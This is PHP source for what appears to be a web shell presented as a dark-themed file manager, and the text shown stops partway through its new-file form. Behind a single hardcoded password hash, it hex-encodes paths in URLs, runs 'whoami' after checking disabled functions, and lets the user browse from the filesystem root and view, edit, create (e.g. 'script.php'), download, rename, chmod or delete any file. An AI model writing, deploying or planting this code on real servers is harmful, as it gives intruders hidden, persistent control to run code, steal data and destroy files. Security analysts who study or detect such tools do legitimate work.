<?php declare(strict_types=1);

const VERSION = '3.0.0';
const THEME = 'dark'; // 'dark' or 'light'
const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2';

// Buffer for storing alerts to display later
$alertMessages = [];

function hexToString(string $hex): string
{
    return pack('H*', $hex);
}

function stringToHex(string $string): string
{
    return unpack('H*', $string)[1];
}

function encryptPath(string $path): string
{
    return stringToHex($path);
}

function decryptPath(string $path): string
{
    return hexToString($path);
}

function authenticate(): bool
{
    if (isset($_POST['password'])) {
        if (password_verify($_POST['password'], PASSWORD_HASH)) {
            $_SESSION['authenticated'] = true;
            return true;
        }
    }
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

function formatSize(int $size): string
{
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function getPerms(string $file): string
{
    $perms = fileperms($file);

    // Simple text-based permissions
    $info = '';

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    // Check if the file/directory is writable
    $isWritable = is_writable($file);
    $isReadable = is_readable($file);

    // Return with color coding
    $colorClass = $isWritable ? 'text-success' : ($isReadable ? 'text-warning' : 'text-error');
    return '<span class="' . $colorClass . ' font-mono text-xs">' . $info . '</span>';
}

function getCurrentUser(): string
{
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $user = posix_getpwuid(posix_geteuid());
        return $user['name'];
    } elseif (function_exists('exec') && !in_array('exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
        $user = exec('whoami');
        return $user;
    } else {
        return getenv('USERNAME') ?: getenv('USER');
    }
}

function breadcrumbPath(string $path): string
{
    $path = rtrim($path, DIRECTORY_SEPARATOR);
    $isWin = DIRECTORY_SEPARATOR === '\\';
    $parts = $isWin ? explode('\\', $path) : explode('/', $path);
    $result = '';

    $breadcrumb = '';

    if ($isWin) {
        if (!empty($parts[0])) {
            $breadcrumb = $parts[0] . '\\';
            $result .= '<a href="?cd=' . encryptPath($breadcrumb) . '" class="text-primary hover:text-primary-hover transition-colors flex items-center"><span>' . htmlspecialchars($parts[0]) . '</span><svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg></a>';
        }
        $pathSoFar = $parts[0] . '\\';
        for ($i = 1; $i < count($parts); $i++) {
            if (!empty($parts[$i])) {
                $pathSoFar .= $parts[$i] . '\\';
                $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="text-primary hover:text-primary-hover transition-colors flex items-center"><span>' . htmlspecialchars($parts[$i]) . '</span>' . ($i < count($parts) - 1 ? '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>' : '') . '</a>';
            }
        }
    } else {
        $result = '<a href="?cd=' . encryptPath('/') . '" class="text-primary hover:text-primary-hover transition-colors flex items-center"><svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg><span>root</span>' . (count($parts) > 1 && !empty($parts[1]) ? '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>' : '') . '</a>';
        $pathSoFar = '/';
        for ($i = 1; $i < count($parts); $i++) {
            if (!empty($parts[$i])) {
                $pathSoFar .= $parts[$i] . '/';
                $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="text-primary hover:text-primary-hover transition-colors flex items-center"><span>' . htmlspecialchars($parts[$i]) . '</span>' . ($i < count($parts) - 1 ? '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>' : '') . '</a>';
            }
        }
    }

    return $result;
}

function renderFileTable(string $dir): string
{
    ob_start(); // Start output buffering

    $allItems = array_diff(scandir($dir), ['.', '..']);

    // Separate folders and files, then sort them separately
    $folders = [];
    $files = [];

    foreach ($allItems as $item) {
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }

    // Sort each array alphabetically
    sort($folders);
    sort($files);

    // Combine with folders first, then files
    $sortedItems = array_merge($folders, $files);

    echo '<div class="file-list-container">';

    // Search bar
    echo '<div class="mb-4">';
    echo '<div class="relative">';
    echo '<div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">';
    echo '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>';
    echo '</div>';
    echo '<input type="text" id="fileSearch" class="w-full pl-10 pr-4 py-2 bg-surface-container border border-outline-variant rounded-lg focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant" placeholder="Search files and folders...">';
    echo '</div>';
    echo '</div>';

    // Desktop Table View
    echo '<div class="hidden md:block w-full overflow-hidden rounded-xl shadow-sm border border-outline-variant">';
    echo '<table class="w-full border-collapse table-auto" id="desktopFileTable">';
    echo '<thead><tr class="bg-surface-container text-on-surface">';
    echo '<th class="border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider">Name</th>';
    echo '<th class="border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider w-24">Size</th>';
    echo '<th class="border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider w-28">Perms</th>';
    echo '<th class="border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider w-40">Modified</th>';
    echo '<th class="border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider w-32">Actions</th>';
    echo '</tr></thead><tbody>';

    // Parent directory link
    echo '<tr class="hover:bg-surface-container-high transition-colors">';
    echo '<td class="border-b border-outline-variant px-4 py-3" colspan="5">';
    echo '<a href="?cd=' . encryptPath(dirname($dir)) . '" class="flex items-center text-primary hover:text-primary-hover transition-colors font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path></svg>';
    echo 'Parent Directory</a>';
    echo '</td>';
    echo '</tr>';

    foreach ($sortedItems as $item) {
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($fullPath);

        echo '<tr class="hover:bg-surface-container-high transition-colors file-row" data-filename="' . htmlspecialchars(strtolower($item)) . '">';
        echo '<td class="border-b border-outline-variant px-4 py-3">';

        if ($isDir) {
            echo '<a href="?cd=' . encryptPath($fullPath) . '" class="flex items-center text-primary hover:text-primary-hover transition-colors group">';
            echo '<div class="p-1.5 bg-surface-container-high rounded-lg mr-3 group-hover:bg-surface-container-highest transition-colors">';
            echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>';
            echo '</div>';
            echo '<span class="font-medium truncate max-w-xs">' . htmlspecialchars($item) . '</span>';
            echo '</a>';
        } else {
            echo '<a href="?action=view&file=' . encryptPath($fullPath) . '" class="flex items-center text-on-surface hover:text-primary transition-colors group">';
            echo '<div class="p-1.5 bg-surface-container rounded-lg mr-3 group-hover:bg-surface-container-high transition-colors">';
            echo '<svg class="h-5 w-5 text-on-surface-variant group-hover:text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>';
            echo '</div>';
            echo '<span class="font-medium truncate max-w-xs">' . htmlspecialchars($item) . '</span>';
            echo '</a>';
        }

        echo '</td>';
        echo '<td class="border-b border-outline-variant px-4 py-3 font-mono text-sm text-on-surface-variant">' . ($isDir ? '-' : formatSize(filesize($fullPath))) . '</td>';
        echo '<td class="border-b border-outline-variant px-4 py-3">' . getPerms($fullPath) . '</td>';
        echo '<td class="border-b border-outline-variant px-4 py-3 text-sm text-on-surface-variant">' . date("Y-m-d H:i", filemtime($fullPath)) . '</td>';
        echo '<td class="border-b border-outline-variant px-4 py-3">';
        echo '<div class="flex items-center gap-1">';

        if (!$isDir) {
            echo '<a href="?download=' . encryptPath($fullPath) . '" class="p-1.5 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Download">';
            echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg></a>';

            echo '<a href="?action=edit&file=' . encryptPath($fullPath) . '" class="p-1.5 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Edit">';
            echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg></a>';
        }

        echo '<a href="#" onclick="showRenameModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-1.5 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Rename">';
        echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg></a>';

        echo '<a href="#" onclick="showChmodModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', \'' . substr(sprintf('%o', fileperms($fullPath)), -4) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-1.5 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Permissions">';
        echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></a>';

        echo '<a href="#" onclick="showDeleteModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-1.5 text-error hover:bg-surface-container-high rounded-lg transition-colors" title="Delete">';
        echo '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg></a>';

        echo '</div>';
        echo '</td></tr>';
    }

    echo '</tbody></table></div>';

    // Mobile Card View
    echo '<div class="md:hidden space-y-3" id="mobileFileList">';

    // Parent directory link (mobile)
    echo '<a href="?cd=' . encryptPath(dirname($dir)) . '" class="flex items-center p-4 bg-surface rounded-xl shadow-sm border border-outline-variant hover:border-primary hover:shadow-md transition-all">';
    echo '<div class="p-2 bg-surface-container rounded-lg mr-4">';
    echo '<svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path></svg>';
    echo '</div>';
    echo '<span class="font-medium text-on-surface">Parent Directory</span>';
    echo '</a>';

    foreach ($sortedItems as $item) {
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($fullPath);

        echo '<div class="file-card bg-surface rounded-xl shadow-sm border border-outline-variant overflow-hidden hover:border-primary hover:shadow-md transition-all" data-filename="' . htmlspecialchars(strtolower($item)) . '">';

        // Main content area (clickable)
        if ($isDir) {
            echo '<a href="?cd=' . encryptPath($fullPath) . '" class="flex items-center p-4 border-b border-outline-variant">';
            echo '<div class="p-3 bg-surface-container-high rounded-xl mr-4">';
            echo '<svg class="h-6 w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>';
            echo '</div>';
            echo '<div class="flex-1 min-w-0">';
            echo '<h3 class="font-semibold text-on-surface truncate">' . htmlspecialchars($item) . '</h3>';
            echo '<p class="text-sm text-on-surface-variant">Directory</p>';
            echo '</div>';
            echo '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>';
            echo '</a>';
        } else {
            echo '<a href="?action=view&file=' . encryptPath($fullPath) . '" class="flex items-center p-4 border-b border-outline-variant">';
            echo '<div class="p-3 bg-surface-container rounded-xl mr-4">';
            echo '<svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>';
            echo '</div>';
            echo '<div class="flex-1 min-w-0">';
            echo '<h3 class="font-semibold text-on-surface truncate">' . htmlspecialchars($item) . '</h3>';
            echo '<p class="text-sm text-on-surface-variant">' . formatSize(filesize($fullPath)) . ' &bull; ' . date("Y-m-d H:i", filemtime($fullPath)) . '</p>';
            echo '</div>';
            echo '</a>';
        }

        // Action buttons
        echo '<div class="flex items-center justify-between px-4 py-3 bg-surface-container">';
        echo '<div class="text-sm">' . getPerms($fullPath) . '</div>';
        echo '<div class="flex items-center gap-2">';

        if (!$isDir) {
            echo '<a href="?download=' . encryptPath($fullPath) . '" class="p-2 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Download">';
            echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg></a>';

            echo '<a href="?action=edit&file=' . encryptPath($fullPath) . '" class="p-2 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Edit">';
            echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg></a>';
        }

        echo '<a href="#" onclick="showRenameModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-2 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Rename">';
        echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg></a>';

        echo '<a href="#" onclick="showChmodModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', \'' . substr(sprintf('%o', fileperms($fullPath)), -4) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-2 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Permissions">';
        echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></a>';

        echo '<a href="#" onclick="showDeleteModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-2 text-error hover:bg-surface-container-high rounded-lg transition-colors" title="Delete">';
        echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg></a>';

        echo '</div></div>';
        echo '</div>';
    }

    echo '</div>'; // End mobile view

    // Empty state
    echo '<div id="emptyState" class="hidden py-12 text-center">';
    echo '<div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-surface-container mb-4">';
    echo '<svg class="h-8 w-8 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
    echo '</div>';
    echo '<h3 class="text-lg font-medium text-on-surface mb-1">No files found</h3>';
    echo '<p class="text-on-surface-variant">Try adjusting your search</p>';
    echo '</div>';

    echo '</div>'; // End container

    // Get the buffered content
    return ob_get_clean();
}

function showAlert(string $message, string $type = 'success'): void
{
    global $alertMessages;
    $alertMessages[] = ['message' => $message, 'type' => $type];
}

function viewFile(string $file): void
{
    $content = htmlspecialchars(file_get_contents($file));

    echo '<div class="max-w-6xl mx-auto">';
    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';

    // Header
    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>';
    echo '</div>';
    echo '<span class="truncate">' . htmlspecialchars(basename($file)) . '</span>';
    echo '</h2>';
    echo '</div>';

    // File info section
    echo '<div class="px-4 sm:px-6 py-3 bg-surface-container-low border-b border-outline-variant">';
    echo '<div class="text-on-surface-variant font-mono text-xs break-all mb-2">' . htmlspecialchars($file) . '</div>';
    echo '<div class="flex flex-wrap items-center gap-x-4 gap-y-1 text-xs text-on-surface-variant">';
    echo '<span>' . formatSize(filesize($file)) . '</span>';
    echo '<span>' . getPerms($file) . '</span>';
    echo '<span>' . date("Y-m-d H:i:s", filemtime($file)) . '</span>';
    echo '</div>';
    echo '</div>';

    // File content
    echo '<div class="p-4 sm:p-6">';
    echo '<pre class="bg-surface-container-highest text-on-surface p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin">' . $content . '</pre>';
    echo '</div>';

    // Actions
    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
    echo '<a href="?action=edit&file=' . encryptPath($file) . '" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg>';
    echo '<span class="hidden sm:inline">Edit</span>';
    echo '<span class="sm:hidden">Edit</span>';
    echo '</a>';

    echo '<a href="?download=' . encryptPath($file) . '" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>';
    echo '<span class="hidden sm:inline">Download</span>';
    echo '<span class="sm:hidden">Save</span>';
    echo '</a>';

    echo '<a href="?cd=' . encryptPath(dirname($file)) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path></svg>';
    echo 'Back';
    echo '</a>';
    echo '</div>';

    echo '</div>';
    echo '</div>';
}

function downloadFile(string $file): void
{
    if (file_exists($file)) {
        $filename = basename($file);
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        flush(); // Flush system output buffer
        readfile($file);
        exit;
    }
}

function editFile(string $file): void
{
    $dirname = dirname($file);

    // Store original action and file parameters
    $action = isset($_GET['action']) ? $_GET['action'] : '';
    $fileParam = isset($_GET['file']) ? $_GET['file'] : '';

    // Process the form submission
    if (isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        // Instead of redirecting, just reset the POST data
        $_POST = array();
        // Display success alert and file manager
        showAlert("File saved successfully!", "success");
        fileManager($dirname);
        return;
    }

    // Show edit form
    $content = htmlspecialchars(file_get_contents($file));

    echo '<div class="max-w-6xl mx-auto">';
    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';

    // Header
    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg>';
    echo '</div>';
    echo '<span class="truncate">Editing: ' . htmlspecialchars(basename($file)) . '</span>';
    echo '</h2>';
    echo '</div>';

    echo '<form method="post">';

    // Textarea
    echo '<div class="p-4 sm:p-6">';
    echo '<textarea name="content" rows="20" class="w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y" style="min-height: 300px;">' . $content . '</textarea>';
    echo '</div>';

    // Actions
    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
    echo '<button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
    echo 'Save Changes';
    echo '</button>';

    echo '<a href="?cd=' . encryptPath($dirname) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
    echo 'Cancel';
    echo '</a>';
    echo '</div>';

    echo '</form>';
    echo '</div>';
    echo '</div>';
}

function newFile(string $dir): void
{
    if (isset($_POST['filename']) && isset($_POST['content'])) {
        if (empty($_POST['filename'])) {
            showAlert("File name cannot be empty!", "error");
            displayNewFileForm($dir);
            return;
        }

        $filename = $dir . DIRECTORY_SEPARATOR . $_POST['filename'];
        file_put_contents($filename, $_POST['content']);

        // Reset POST data and show file manager
        $_POST = array();
        showAlert("File created successfully!", "success");
        fileManager($dir);
        return;
    }

    displayNewFileForm($dir);
}

function displayNewFileForm(string $dir): void
{
    echo '<div class="max-w-4xl mx-auto">';
    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';

    // Header
    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
    echo '</div>';
    echo 'Create New File';
    echo '</h2>';
    echo '</div>';

    echo '<form method="post">';

    echo '<div class="p-4 sm:p-6 space-y-4">';

    // Location
    echo '<div class="p-3 bg-surface-container rounded-xl border border-outline-variant">';
    echo '<span class="text-sm text-on-surface-variant">Location:</span>';
    echo '<span class="ml-2 text-sm font-mono text-on-surface break-all">' . htmlspecialchars($dir) . '</span>';
    echo '</div>';

    // Filename
    echo '<div>';
    echo '<label class="block text-sm font-medium text-on-surface mb-2">Filename</label>';
    echo '<input type="text" name="filename" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-shadow" placeholder="Enter filename (e.g., script.php)" required>';
    echo '</div>';

    // Content
    echo '<div>';
    echo '<label class="block text-sm font-medium text-on-surface mb-2">Content</label>';
    echo '<textarea name="content" rows="12" class="w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y" style="min-height: 250px;" placeholder="Enter file content here..."></textarea>';
    echo '</div>';

    echo '</div>';

    // Actions
    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
    echo '<button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
    echo 'Create File';
    echo '</button>';

